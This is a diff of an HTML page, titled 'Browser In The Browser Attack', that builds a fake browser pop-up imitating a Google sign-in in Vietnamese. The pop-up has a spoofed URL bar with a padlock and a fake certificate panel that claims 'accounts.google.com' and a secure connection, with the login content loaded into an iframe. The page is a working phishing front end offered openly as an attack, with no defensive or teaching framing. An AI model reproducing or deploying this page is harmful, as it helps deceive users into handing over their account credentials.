@@ -6,36 +6,75 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="stylesheet" href="style.css">
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-	<title>Phishing</title>
-	<link rel="icon" type="image/png" href="../crf.jpg">
+	<title>Browser In The Browser Attack</title>
+	<link rel="icon" type="image/png" href="../logo.jpg">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 
 <body>
-	<img id="clickme" src="../loginms.png" style="display: flex; margin: auto; margin-top: 100px;"></img>
-	<div id="window">
-		<!-- Title bar start -->
-		<div id="title-bar-width">
-			<div id="title-bar">
-				<div style="margin-top:5px;">
-					<img src="../google.svg" height="18px" id="logo">
-					<span id="logo-description">Đăng nhập</span>
-				</div>
+	<img id="clickme" height="50px" src="../login-gg.png" style="display: flex; margin: auto; margin-top: 200px;"></img>
+	<div style="display: flex;justify-content: center;margin-top: -200px;">
+		<div id="window">
+			<!-- Title bar start -->
+			<div id="title-bar-width">
+				<div id="title-bar">
+					<div style="margin-top:5px;">
+						<img src="../google.svg" height="18px" id="logo">
+						<span id="logo-description">Đăng nhập</span>
+					</div>
 
-				<div>
-					<span id="minimize">&#8212;</span>
-					<span id="square">□</span>
-					<span id="exit">✕</span>
+					<div>
+						<span id="minimize">&#8212;</span>
+						<span id="square">□</span>
+						<span id="exit">✕</span>
+					</div>
+				</div>
+				<div id="url-bar">
+					<img src="../ssl.svg" width="20px" height="20px" id="ssl-padlock" title="Xem thông tin trang web">
+					<span id="domain-name"></span>
+					<span id="domain-path">about:blank</span>
+				</div>
+				<div id="ssl-certificate">
+					<div class="domain-verify">
+						<span id="domain-name-verify">accounts.google.com</span>
+						<span class="ssl-close">✕</span>
+					</div>
+					<ul class="cert-info">
+						<li class="cert-info-item">
+							<div>
+								<i class="cert-info-icon fa-solid fa-lock"></i>
+								<span class="cert-info-name">Kết nối an toàn</span>
+							</div>
+							<div class="cert-info-more">
+								<i class="cert-info-icon fa-solid fa-caret-right"></i>
+							</div>
+						</li>
+						<li class="cert-info-item">
+							<div>
+								<i class="cert-info-icon fa-solid fa-cookie-bite"></i>
+								<span class="cert-info-name">Cookie</span>
+							</div>
+							<div class="cert-info-more">
+								Đang sử dụng 5 cookies
+								<i class="cert-info-icon fa-solid fa-up-right-from-square"></i>
+							</div>
+						</li>
+						<li class="cert-info-item">
+							<div>
+								<i class="cert-info-icon fa-solid fa-gear"></i>
+								<span class="cert-info-name">Cài đặt trang web</span>
+							</div>
+							<div class="cert-info-more">
+								<i class="cert-info-icon fa-solid fa-up-right-from-square"></i>
+							</div>
+						</li>
+					</ul>
 				</div>
 			</div>
-			<div id="url-bar">
-				<img src="../ssl.svg" width="20px" height="20px" id="ssl-padlock">
-				<span id="domain-name"></span>
-				<span id="domain-path">about:blank</span>
+			<!-- Content start -->
+			<div id="load">
+				<iframe id="content" frameBorder="0"></iframe>
 			</div>
-		</div>
-		<!-- Content start -->
-		<div id="load">
-			<iframe id="content" frameBorder="0"></iframe>
 		</div>
 	</div>
 </body>
